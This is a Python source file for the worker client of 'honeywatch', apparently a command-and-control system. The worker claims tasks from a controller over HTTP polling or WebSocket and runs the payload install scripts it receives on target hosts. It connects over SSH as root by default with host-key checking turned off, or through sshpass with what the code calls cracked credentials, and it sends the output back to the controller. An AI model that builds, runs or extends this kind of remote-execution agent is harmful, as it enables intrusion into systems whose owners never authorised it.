"""C2 worker client for honeywatch.

Connects to the controller, claims tasks in allowed payload categories, and
executes the rendered payload install script on the target. Two transport
modes: WebSocket (if ``websockets`` is installed) or HTTP polling via stdlib
``urllib``.

Execution modes:
- ``dry_run``: report the script without running it.
- ``local_simulate``: execute the script on the worker host itself.
- ``ssh``: run the script on the target host via ``ssh`` using provided
credentials or keys.
"""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
import tempfile
import time
import urllib.error
import urllib.request
import uuid
from typing import Any

from honeywatch.models import Target, WorkerTask

# Optional WebSocket transport.
try:
    import websockets

    HAS_WEBSOCKETS = True
except Exception:  # pragma: no cover - optional dependency
    websockets = None  # type: ignore[assignment]
    HAS_WEBSOCKETS = False


class WorkerError(Exception):
    """Raised when the worker cannot reach the controller or execute a task."""


class Worker:
    """Pulls tasks from a honeywatch C2 controller and executes them."""

    def __init__(
        self,
        controller_url: str,
        worker_id: str | None = None,
        categories: list[str] | None = None,
        exec_mode: str = "dry_run",
        poll_interval: float = 5.0,
        ssh_key: str | None = None,
        ssh_user: str = "root",
        api_token: str | None = None,
    ):
        self.controller_url = controller_url.rstrip("/")
        self.worker_id = worker_id or f"worker-{uuid.uuid4().hex[:8]}"
        self.categories = list(categories) if categories else []
        self.exec_mode = exec_mode
        self.poll_interval = poll_interval
        self.ssh_key = ssh_key
        self.ssh_user = ssh_user
        # Optional shared bearer secret. When set, it is sent on every HTTP
        # request (Authorization header) and every WebSocket handshake (?token=).
        self.api_token = api_token
        self._shutdown = False

    # ------------------------------------------------------------------ #
    # HTTP helpers
    # ------------------------------------------------------------------ #
    def _request(
        self,
        method: str,
        path: str,
        data: dict[str, Any] | None = None,
        timeout: float = 30.0,
    ) -> dict[str, Any]:
        url = f"{self.controller_url}{path}"
        headers: dict[str, str] = {}
        if data is not None:
            headers["Content-Type"] = "application/json"
        if self.api_token:
            headers["Authorization"] = f"Bearer {self.api_token}"
        body = json.dumps(data).encode("utf-8") if data else None
        req = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method=method,
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                text = resp.read().decode("utf-8", "replace")
                if not text:
                    return {}
                return json.loads(text)
        except urllib.error.HTTPError as exc:
            if exc.code == 204:
                return {}
            text = exc.read().decode("utf-8", "replace")
            raise WorkerError(f"controller returned {exc.code}: {text[:500]}") from exc
        except urllib.error.URLError as exc:
            raise WorkerError(f"cannot reach controller at {url}: {exc}") from exc

    # ------------------------------------------------------------------ #
    # Task lifecycle
    # ------------------------------------------------------------------ #
    def claim_task(self) -> WorkerTask | None:
        resp = self._request(
            "POST",
            "/api/tasks/claim",
            {
                "worker_id": self.worker_id,
                "categories": self.categories,
            },
        )
        task_data = resp.get("task")
        if not task_data:
            return None
        return _task_from_dict(task_data)

    def report_result(
        self, task_id: str, success: bool, result: dict[str, Any]
    ) -> None:
        self._request(
            "POST",
            f"/api/tasks/{task_id}/result",
            {
                "worker_id": self.worker_id,
                "success": success,
                "result": result,
            },
        )

    def execute_task(self, task: WorkerTask) -> dict[str, Any]:
        """Execute ``task.script`` according to ``self.exec_mode``."""
        if self.exec_mode == "dry_run":
            return {
                "mode": "dry_run",
                "target": task.target.ip if task.target else None,
                "script": task.script,
                "script_length": len(task.script),
                "stdout": "[dry run - script not executed]",
            }

        if self.exec_mode == "local_simulate":
            return self._run_shell(task.script, task.target)

        if self.exec_mode == "ssh":
            return self._run_ssh(task.script, task.target)

        return {"error": f"unknown exec_mode: {self.exec_mode!r}"}

    def _run_shell(self, script: str, target: Target | None) -> dict[str, Any]:
        with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as fh:
            fh.write(script)
            path = fh.name
        try:
            os.chmod(path, 0o700)
            proc = subprocess.run(
                ["/bin/sh", path],
                capture_output=True,
                text=True,
                timeout=600,
            )
            return {
                "mode": "local_simulate",
                "target": target.ip if target else None,
                "returncode": proc.returncode,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
            }
        except subprocess.TimeoutExpired:
            return {"mode": "local_simulate", "target": target.ip if target else None, "error": "timeout"}
        except Exception as exc:
            return {"mode": "local_simulate", "target": target.ip if target else None, "error": str(exc)}
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass

    def _run_ssh(self, script: str, target: Target | None) -> dict[str, Any]:
        if target is None:
            return {"mode": "ssh", "error": "task has no target"}
        user = target.ssh_user or self.ssh_user
        key = target.ssh_key or self.ssh_key
        passw = target.ssh_pass
        # Key auth: BatchMode=yes, stdin-piped script.
        if key or not passw:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes"]
            if key:
                argv += ["-i", key]
            argv += [f"{user}@{target.ip}"]
            try:
                proc = subprocess.run(
                    argv,
                    input=script,
                    capture_output=True,
                    text=True,
                    timeout=600,
                )
                return {
                    "mode": "ssh",
                    "target": f"{user}@{target.ip}",
                    "returncode": proc.returncode,
                    "stdout": proc.stdout,
                    "stderr": proc.stderr,
                }
            except subprocess.TimeoutExpired:
                return {"mode": "ssh", "target": f"{user}@{target.ip}", "error": "timeout"}
            except Exception as exc:
                return {"mode": "ssh", "target": f"{user}@{target.ip}", "error": str(exc)}
        # Password auth (cracked credential): delegate to sshpass when present.
        argv = ["sshpass", "-p", passw,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no",
                f"{user}@{target.ip}"]
        try:
            proc = subprocess.run(
                argv,
                input=script,
                capture_output=True,
                text=True,
                timeout=600,
            )
            return {
                "mode": "ssh",
                "auth": "password",
                "target": f"{user}@{target.ip}",
                "returncode": proc.returncode,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
            }
        except FileNotFoundError:
            return {
                "mode": "ssh",
                "auth": "password",
                "target": f"{user}@{target.ip}",
                "error": "sshpass not installed; cannot use password auth",
            }
        except subprocess.TimeoutExpired:
            return {"mode": "ssh", "auth": "password", "target": f"{user}@{target.ip}", "error": "timeout"}
        except Exception as exc:
            return {"mode": "ssh", "auth": "password", "target": f"{user}@{target.ip}", "error": str(exc)}

    # ------------------------------------------------------------------ #
    # Loop
    # ------------------------------------------------------------------ #
    async def run(self) -> None:
        """Run the worker until ``stop()`` is called."""
        if HAS_WEBSOCKETS and self.controller_url.startswith("ws"):
            await self._run_websocket()
        else:
            await self._run_polling()

    async def _run_polling(self) -> None:
        backoff = self.poll_interval
        max_backoff = max(self.poll_interval * 12, 60.0)
        while not self._shutdown:
            try:
                task = await asyncio.to_thread(self.claim_task)
                if task is None:
                    backoff = min(backoff * 1.5, max_backoff) if backoff > self.poll_interval else self.poll_interval
                    await asyncio.sleep(self.poll_interval)
                    continue
                backoff = self.poll_interval  # reset after successful work
                result = await asyncio.to_thread(self.execute_task, task)
                success = result.get("returncode") == 0 and "error" not in result
                await asyncio.to_thread(self.report_result, task.id, success, result)
            except WorkerError as exc:
                print(f"honeywatch worker: controller error: {exc}", flush=True)
                # Exponential backoff so a controller outage doesn't hammer it.
                await asyncio.sleep(min(backoff, max_backoff))
                backoff = min(backoff * 2, max_backoff)
            except Exception as exc:
                print(f"honeywatch worker: task error: {exc}", flush=True)
                await asyncio.sleep(self.poll_interval)

    async def _run_websocket(self) -> None:
        if websockets is None:  # pragma: no cover
            raise WorkerError("websockets module is not available")
        uri = self.controller_url
        if uri.startswith("http"):
            uri = uri.replace("http", "ws", 1)
        if self.api_token:
            sep = "&" if "?" in uri else "?"
            uri = f"{uri}{sep}token={self.api_token}"
        async with websockets.connect(uri) as ws:
            await ws.send(
                json.dumps(
                    {
                        "type": "register_worker",
                        "worker_id": self.worker_id,
                        "categories": self.categories,
                    }
                )
            )
            while not self._shutdown:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=self.poll_interval)
                    payload = json.loads(msg)
                    if payload.get("type") == "task":
                        task = _task_from_dict(payload["task"])
                        result = await asyncio.to_thread(self.execute_task, task)
                        success = result.get("returncode") == 0 and "error" not in result
                        await ws.send(
                            json.dumps(
                                {
                                    "type": "task_result",
                                    "task_id": task.id,
                                    "success": success,
                                    "result": result,
                                }
                            )
                        )
                except asyncio.TimeoutError:
                    # fall back to HTTP claim when no WS task is pushed
                    try:
                        task = await asyncio.to_thread(self.claim_task)
                        if task is not None:
                            result = await asyncio.to_thread(self.execute_task, task)
                            success = (
                                result.get("returncode") == 0 and "error" not in result
                            )
                            await ws.send(
                                json.dumps(
                                    {
                                        "type": "task_result",
                                        "task_id": task.id,
                                        "success": success,
                                        "result": result,
                                    }
                                )
                            )
                    except Exception as exc:
                        print(f"honeywatch worker: {exc}", flush=True)
                except Exception as exc:
                    print(f"honeywatch worker: websocket error: {exc}", flush=True)
                    await asyncio.sleep(self.poll_interval)

    def stop(self) -> None:
        self._shutdown = True


def _task_from_dict(data: dict[str, Any]) -> WorkerTask:
    target_data = data.get("target")
    target = None
    if target_data:
        target = Target(
            ip=target_data.get("ip", ""),
            port=int(target_data.get("port", 22)),
            label=target_data.get("label", ""),
            confidence=float(target_data.get("confidence", 0.0)),
            profile_key=target_data.get("profile_key", ""),
            allowed_categories=list(target_data.get("allowed_categories", [])),
            ssh_user=target_data.get("ssh_user"),
            ssh_key=target_data.get("ssh_key"),
            ssh_pass=target_data.get("ssh_pass"),
        )
    return WorkerTask(
        id=data.get("id", ""),
        operation_id=data.get("operation_id", ""),
        payload_id=data.get("payload_id", ""),
        category=data.get("category", ""),
        target=target,
        script=data.get("script", ""),
        variables=dict(data.get("variables", {})),
        status=data.get("status", "pending"),
        worker_id=data.get("worker_id"),
        result=data.get("result"),
    )
